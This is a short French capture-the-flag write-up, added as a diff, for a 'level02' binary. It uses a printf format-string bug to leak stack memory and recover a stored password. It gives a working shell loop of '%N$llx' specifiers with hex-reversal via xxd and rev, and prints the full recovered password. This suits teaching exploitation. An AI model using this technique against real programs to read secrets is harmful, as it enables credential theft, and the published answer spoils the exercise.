@@ -1,0 +1,37 @@
+1er: Creation du main
+
+On peut oberver un printf() de la string username. Cett string ce trouve en dessus de la string ou le password est sauvgarder. Donc on va faire un script afin de d'afficher en hexa.
+
+J'ai commence avce une script ou je commencais a 1 jusqu'a 255. Mais pour plus de lisbilite je vais faire une boucle entre les arguments 20 et 30 de notre printf.
+
+	for i in {20..30};do echo "%$i\$llx" |./level02 | grep 'does not'| cut -c1-16 ; done
+100000000 does n
+0 does not have
+756e505234376848
+45414a3561733951
+377a7143574e6758
+354a35686e475873
+48336750664b394d
+0 does not have
+786c6c24383225 d
+0 does not have
+0 does not have
+
+On peut voir 5 lignes 8 octets, ce qui correspond a 0x5 * 0x8 = 0x29. La meme taille que notre buffer ou le .pass est ecrit.
+Ne pas oublier que c est hexa est en little-endian donc on va convertir les 8 premiers octets en string puis inversee cette string.
+
+Donc dans notre srcipt on va rajouter une commande pour faire une convertion hexa en char, puis inverser cette chaine avec `xxd -r -p | rev`
+
+for i in {20..30};do echo "%$i\$llx" |./level02 | grep 'does not'| cut -c1-16 | xxd -r -p | rev; done
+
+
+Hh74RPnu
+Q9sa5JAE
+XgNWCqz7
+sXGnh5J5
+M9KfPg3H
+
+%28$llx
+
+
+Donc notre chaine est 'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H' 
